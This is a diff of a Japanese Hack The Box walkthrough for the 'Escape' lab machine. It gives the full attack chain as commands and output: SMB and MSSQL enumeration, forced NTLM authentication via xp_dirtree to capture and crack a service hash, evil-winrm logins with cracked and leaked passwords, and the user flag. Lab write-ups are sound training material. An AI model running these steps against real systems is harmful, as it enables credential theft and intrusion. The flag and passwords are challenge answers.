@@ -2,56 +2,56 @@ https://app.hackthebox.com/machines/531
 
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.228.253 --no-banner --scripts none
+└─$ rustscan -a 10.129.80.180 --no-banner --scripts none
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
-Open 10.129.228.253:53
-Open 10.129.228.253:88
-Open 10.129.228.253:593
-Open 10.129.228.253:636
-Open 10.129.228.253:1433
-Open 10.129.228.253:3268
-Open 10.129.228.253:3269
-Open 10.129.228.253:5985
-Open 10.129.228.253:9389
-Open 10.129.228.253:49667
-Open 10.129.228.253:49690
-Open 10.129.228.253:49689
-Open 10.129.228.253:49711
-Open 10.129.228.253:49721
-Open 10.129.228.253:49742
-10.129.228.253 -> [53,88,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
+Open 10.129.80.180:53
+Open 10.129.80.180:88
+Open 10.129.80.180:593
+Open 10.129.80.180:636
+Open 10.129.80.180:1433
+Open 10.129.80.180:3268
+Open 10.129.80.180:3269
+Open 10.129.80.180:5985
+Open 10.129.80.180:9389
+Open 10.129.80.180:49667
+Open 10.129.80.180:49690
+Open 10.129.80.180:49689
+Open 10.129.80.180:49711
+Open 10.129.80.180:49721
+Open 10.129.80.180:49742
+10.129.80.180 -> [53,88,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
 ```
 
 
 ## STEP 2
 guestでsmb列挙
 ```sh
-└─$ netexec smb 10.129.228.253 -u ' ' -p '' --shares
-SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
-SMB         10.129.228.253  445    DC               [+] sequel.htb\ : (Guest)
-SMB         10.129.228.253  445    DC               [*] Enumerated shares
-SMB         10.129.228.253  445    DC               Share           Permissions     Remark
-SMB         10.129.228.253  445    DC               -----           -----------     ------
-SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
-SMB         10.129.228.253  445    DC               C$                              Default share
-SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
-SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
-SMB         10.129.228.253  445    DC               Public          READ            
-SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
+└─$ netexec smb 10.129.80.180 -u ' ' -p '' --shares
+SMB         10.129.80.180  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.80.180  445    DC               [+] sequel.htb\ : (Guest)
+SMB         10.129.80.180  445    DC               [*] Enumerated shares
+SMB         10.129.80.180  445    DC               Share           Permissions     Remark
+SMB         10.129.80.180  445    DC               -----           -----------     ------
+SMB         10.129.80.180  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.80.180  445    DC               C$                              Default share
+SMB         10.129.80.180  445    DC               IPC$            READ            Remote IPC
+SMB         10.129.80.180  445    DC               NETLOGON                        Logon server share 
+SMB         10.129.80.180  445    DC               Public          READ            
+SMB         10.129.80.180  445    DC               SYSVOL                          Logon server share
 ```
 pdfファイルを発見・ダウンロード
 ```sh
-└─$ smbclient -N -c ls //10.129.228.253/Public          
+└─$ smbclient -N -c ls //10.129.80.180/Public          
   .                                   D        0  Sat Nov 19 11:51:25 2022
   ..                                  D        0  Sat Nov 19 11:51:25 2022
   SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022
 
                 5184255 blocks of size 4096. 1447083 blocks available
 
-└─$ smbget -N 'smb://10.129.228.253/Public/SQL Server Procedures.pdf'
+└─$ smbget -N 'smb://10.129.80.180/Public/SQL Server Procedures.pdf'
 Using domain: WORKGROUP, user: kali
-smb://10.129.228.253/Public/SQL Server Procedures.pdf 
+smb://10.129.80.180/Public/SQL Server Procedures.pdf 
 Downloaded 48.39kB in 15 seconds
 ```
 pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作している  
@@ -59,7 +59,7 @@ pdfはmssqlに関するもの、step1で1433番がオープンであったこと
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Escape_01.png">  
 pdfのクレデンシャルでmssqlにログイン成功
 ```sh
-└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.228.253'
+└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.80.180'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Encryption required, switching to TLS
@@ -90,98 +90,98 @@ username => PublicUser
 msf auxiliary(admin/mssql/mssql_enum) > set password GuestUserCantWrite1
 password => GuestUserCantWrite1
 
-msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.228.253
-rhosts => 10.129.228.253
+msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.80.180
+rhosts => 10.129.80.180
 
 msf auxiliary(admin/mssql/mssql_enum) > run
-[*] Running module against 10.129.228.253
-[*] 10.129.228.253:1433 - Running MS SQL Server Enumeration...
-[*] 10.129.228.253:1433 - Version:
+[*] Running module against 10.129.80.180
+[*] 10.129.80.180:1433 - Running MS SQL Server Enumeration...
+[*] 10.129.80.180:1433 - Version:
 [*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
 [*]             Sep 24 2019 13:48:23 
 [*]             Copyright (C) 2019 Microsoft Corporation
 [*]             Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
-[*] 10.129.228.253:1433 - Configuration Parameters:
-[*] 10.129.228.253:1433 -       C2 Audit Mode is Not Enabled
-[*] 10.129.228.253:1433 -       xp_cmdshell is Not Enabled
-[*] 10.129.228.253:1433 -       remote access is Enabled
-[*] 10.129.228.253:1433 -       allow updates is Not Enabled
-[*] 10.129.228.253:1433 -       Database Mail XPs is Not Enabled
-[*] 10.129.228.253:1433 -       Ole Automation Procedures are Not Enabled
-[*] 10.129.228.253:1433 - Databases on the server:
-[*] 10.129.228.253:1433 -       Database name:master
-[*] 10.129.228.253:1433 -       Database Files for master:
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
-[*] 10.129.228.253:1433 -       Database name:tempdb
-[*] 10.129.228.253:1433 -       Database Files for tempdb:
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
-[*] 10.129.228.253:1433 -       Database name:model
-[*] 10.129.228.253:1433 -       Database Files for model:
-[*] 10.129.228.253:1433 -       Database name:msdb
-[*] 10.129.228.253:1433 -       Database Files for msdb:
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
-[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
-[*] 10.129.228.253:1433 - System Logins on this Server:
-[*] 10.129.228.253:1433 -       sa
-[*] 10.129.228.253:1433 -       PublicUser
-[*] 10.129.228.253:1433 - Disabled Accounts:
-[*] 10.129.228.253:1433 -       No Disabled Logins Found
-[*] 10.129.228.253:1433 - No Accounts Policy is set for:
-[*] 10.129.228.253:1433 -       All System Accounts have the Windows Account Policy Applied to them.
-[*] 10.129.228.253:1433 - Password Expiration is not checked for:
-[*] 10.129.228.253:1433 -       sa
-[*] 10.129.228.253:1433 -       PublicUser
-[*] 10.129.228.253:1433 - System Admin Logins on this Server:
-[*] 10.129.228.253:1433 -       sa
-[*] 10.129.228.253:1433 - Windows Logins on this Server:
-[*] 10.129.228.253:1433 -       No Windows logins found!
-[*] 10.129.228.253:1433 - Windows Groups that can logins on this Server:
-[*] 10.129.228.253:1433 -       No Windows Groups where found with permission to login to system.
-[*] 10.129.228.253:1433 - Accounts with Username and Password being the same:
-[*] 10.129.228.253:1433 -       No Account with its password being the same as its username was found.
-[*] 10.129.228.253:1433 - Accounts with empty password:
-[*] 10.129.228.253:1433 -       No Accounts with empty passwords where found.
-[*] 10.129.228.253:1433 - Stored Procedures with Public Execute Permission found:
-[*] 10.129.228.253:1433 -       sp_replsetsyncstatus
-[*] 10.129.228.253:1433 -       sp_replcounters
-[*] 10.129.228.253:1433 -       sp_replsendtoqueue
-[*] 10.129.228.253:1433 -       sp_resyncexecutesql
-[*] 10.129.228.253:1433 -       sp_prepexecrpc
-[*] 10.129.228.253:1433 -       sp_repltrans
-[*] 10.129.228.253:1433 -       sp_xml_preparedocument
-[*] 10.129.228.253:1433 -       xp_qv
-[*] 10.129.228.253:1433 -       xp_getnetname
-[*] 10.129.228.253:1433 -       sp_releaseschemalock
-[*] 10.129.228.253:1433 -       sp_refreshview
-[*] 10.129.228.253:1433 -       sp_replcmds
-[*] 10.129.228.253:1433 -       sp_unprepare
-[*] 10.129.228.253:1433 -       sp_resyncprepare
-[*] 10.129.228.253:1433 -       sp_createorphan
-[*] 10.129.228.253:1433 -       xp_dirtree
-[*] 10.129.228.253:1433 -       sp_replwritetovarbin
-[*] 10.129.228.253:1433 -       sp_replsetoriginator
-[*] 10.129.228.253:1433 -       sp_xml_removedocument
-[*] 10.129.228.253:1433 -       sp_repldone
-[*] 10.129.228.253:1433 -       sp_reset_connection
-[*] 10.129.228.253:1433 -       xp_fileexist
-[*] 10.129.228.253:1433 -       xp_fixeddrives
-[*] 10.129.228.253:1433 -       sp_getschemalock
-[*] 10.129.228.253:1433 -       sp_prepexec
-[*] 10.129.228.253:1433 -       xp_revokelogin
-[*] 10.129.228.253:1433 -       sp_execute_external_script
-[*] 10.129.228.253:1433 -       sp_resyncuniquetable
-[*] 10.129.228.253:1433 -       sp_replflush
-[*] 10.129.228.253:1433 -       sp_resyncexecute
-[*] 10.129.228.253:1433 -       xp_grantlogin
-[*] 10.129.228.253:1433 -       sp_droporphans
-[*] 10.129.228.253:1433 -       xp_regread
-[*] 10.129.228.253:1433 -       sp_getbindtoken
-[*] 10.129.228.253:1433 -       sp_replincrementlsn
-[*] 10.129.228.253:1433 - Instances found on this server:
-[*] 10.129.228.253:1433 - Default Server Instance SQL Server Service is running under the privilege of:
-[*] 10.129.228.253:1433 -       xp_regread might be disabled in this system
+[*] 10.129.80.180:1433 - Configuration Parameters:
+[*] 10.129.80.180:1433 -       C2 Audit Mode is Not Enabled
+[*] 10.129.80.180:1433 -       xp_cmdshell is Not Enabled
+[*] 10.129.80.180:1433 -       remote access is Enabled
+[*] 10.129.80.180:1433 -       allow updates is Not Enabled
+[*] 10.129.80.180:1433 -       Database Mail XPs is Not Enabled
+[*] 10.129.80.180:1433 -       Ole Automation Procedures are Not Enabled
+[*] 10.129.80.180:1433 - Databases on the server:
+[*] 10.129.80.180:1433 -       Database name:master
+[*] 10.129.80.180:1433 -       Database Files for master:
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
+[*] 10.129.80.180:1433 -       Database name:tempdb
+[*] 10.129.80.180:1433 -       Database Files for tempdb:
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
+[*] 10.129.80.180:1433 -       Database name:model
+[*] 10.129.80.180:1433 -       Database Files for model:
+[*] 10.129.80.180:1433 -       Database name:msdb
+[*] 10.129.80.180:1433 -       Database Files for msdb:
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
+[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
+[*] 10.129.80.180:1433 - System Logins on this Server:
+[*] 10.129.80.180:1433 -       sa
+[*] 10.129.80.180:1433 -       PublicUser
+[*] 10.129.80.180:1433 - Disabled Accounts:
+[*] 10.129.80.180:1433 -       No Disabled Logins Found
+[*] 10.129.80.180:1433 - No Accounts Policy is set for:
+[*] 10.129.80.180:1433 -       All System Accounts have the Windows Account Policy Applied to them.
+[*] 10.129.80.180:1433 - Password Expiration is not checked for:
+[*] 10.129.80.180:1433 -       sa
+[*] 10.129.80.180:1433 -       PublicUser
+[*] 10.129.80.180:1433 - System Admin Logins on this Server:
+[*] 10.129.80.180:1433 -       sa
+[*] 10.129.80.180:1433 - Windows Logins on this Server:
+[*] 10.129.80.180:1433 -       No Windows logins found!
+[*] 10.129.80.180:1433 - Windows Groups that can logins on this Server:
+[*] 10.129.80.180:1433 -       No Windows Groups where found with permission to login to system.
+[*] 10.129.80.180:1433 - Accounts with Username and Password being the same:
+[*] 10.129.80.180:1433 -       No Account with its password being the same as its username was found.
+[*] 10.129.80.180:1433 - Accounts with empty password:
+[*] 10.129.80.180:1433 -       No Accounts with empty passwords where found.
+[*] 10.129.80.180:1433 - Stored Procedures with Public Execute Permission found:
+[*] 10.129.80.180:1433 -       sp_replsetsyncstatus
+[*] 10.129.80.180:1433 -       sp_replcounters
+[*] 10.129.80.180:1433 -       sp_replsendtoqueue
+[*] 10.129.80.180:1433 -       sp_resyncexecutesql
+[*] 10.129.80.180:1433 -       sp_prepexecrpc
+[*] 10.129.80.180:1433 -       sp_repltrans
+[*] 10.129.80.180:1433 -       sp_xml_preparedocument
+[*] 10.129.80.180:1433 -       xp_qv
+[*] 10.129.80.180:1433 -       xp_getnetname
+[*] 10.129.80.180:1433 -       sp_releaseschemalock
+[*] 10.129.80.180:1433 -       sp_refreshview
+[*] 10.129.80.180:1433 -       sp_replcmds
+[*] 10.129.80.180:1433 -       sp_unprepare
+[*] 10.129.80.180:1433 -       sp_resyncprepare
+[*] 10.129.80.180:1433 -       sp_createorphan
+[*] 10.129.80.180:1433 -       xp_dirtree
+[*] 10.129.80.180:1433 -       sp_replwritetovarbin
+[*] 10.129.80.180:1433 -       sp_replsetoriginator
+[*] 10.129.80.180:1433 -       sp_xml_removedocument
+[*] 10.129.80.180:1433 -       sp_repldone
+[*] 10.129.80.180:1433 -       sp_reset_connection
+[*] 10.129.80.180:1433 -       xp_fileexist
+[*] 10.129.80.180:1433 -       xp_fixeddrives
+[*] 10.129.80.180:1433 -       sp_getschemalock
+[*] 10.129.80.180:1433 -       sp_prepexec
+[*] 10.129.80.180:1433 -       xp_revokelogin
+[*] 10.129.80.180:1433 -       sp_execute_external_script
+[*] 10.129.80.180:1433 -       sp_resyncuniquetable
+[*] 10.129.80.180:1433 -       sp_replflush
+[*] 10.129.80.180:1433 -       sp_resyncexecute
+[*] 10.129.80.180:1433 -       xp_grantlogin
+[*] 10.129.80.180:1433 -       sp_droporphans
+[*] 10.129.80.180:1433 -       xp_regread
+[*] 10.129.80.180:1433 -       sp_getbindtoken
+[*] 10.129.80.180:1433 -       sp_replincrementlsn
+[*] 10.129.80.180:1433 - Instances found on this server:
+[*] 10.129.80.180:1433 - Default Server Instance SQL Server Service is running under the privilege of:
+[*] 10.129.80.180:1433 -       xp_regread might be disabled in this system
 [*] Auxiliary module execution completed
 ```
 ということで、ストアドプロシージャのxp_dirtreeでkaliに認証リクエストを飛ばしクレデンシャルをキャプチャ
@@ -260,7 +260,7 @@ subdirectory   depth   file
 
 [+] Listening for events...                                                                                                                                            
 
-[SMB] NTLMv2-SSP Client   : 10.129.228.253
+[SMB] NTLMv2-SSP Client   : 10.129.80.180
 [SMB] NTLMv2-SSP Username : sequel\sql_svc
 [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C00030014003500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC01060004000200000008003000300000000000000000000000003000004136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
 ```
@@ -280,4 +280,62 @@ NetNTLMv2, HC: 5600 JtR: netntlmv2
 
 └─$ hashcat -a 0 -m 5600 sql_svc.txt /usr/share/wordlists/rockyou.txt --quiet
 SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:010100000000000080fcbbd78644dc017b47d91af8df22a000000000020008003500340038004f0001001e00570049004e002d0031004c0052005a004f0048003300310043003200460004003400570049004e002d0031004c0052005a004f004800330031004300320046002e003500340038004f002e004c004f00430041004c00030014003500340038004f002e004c004f00430041004c00050014003500340038004f002e004c004f00430041004c000700080080fcbbd78644dc01060004000200000008003000300000000000000000000000003000004136924fe60d10cb1e5aa1d1fd8055aa7669d12d66160b96227646026a91227d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:REGGIE1234ronnie
+```
+STEP1で5985番オープンを確認、またsql_svcはwinrmログイン可能を確認
+```sh
+└─$ netexec ldap 10.129.80.180 -u 'sequel.htb\sql_svc' -p 'REGGIE1234ronnie' --groups 'Remote Management Users'
+LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+LDAPS       10.129.80.180   636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+LDAPS       10.129.80.180   636    DC               sql_svc
+LDAPS       10.129.80.180   636    DC               Ryan.Cooper
+```
+winrmログイン成功
+```powershell
+└─$ evil-winrm -i 10.129.80.180 -u sql_svc -p REGGIE1234ronnie
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\users\sql_svc\documents>
+```
+
+
+## STEP 4
+ログファイル内に、ユーザ名Ryan.Cooperのログイン失敗を確認  
+その後にユーザ名`NuclearMosquito3`で認証失敗を確認したが、こいつがパスワードかも
+```powershell
+*Evil-WinRM* PS C:\users\sql_svc\documents> cat C:\SQLServer\Logs\ERRORLOG.BAK
+
+~~~
+
+2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
+2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
+2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
+2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
+2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
+2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
+2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
+```
+step3でRyan.Cooperもwinrmログイン可能と確認  
+ということでログイン成功、ユーザフラグゲット
+```powershell
+└─$ evil-winrm -i 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cat ../desktop/user.txt
+4ac86daa61bf3a9b8a9202dfad7e1b9c
 ```
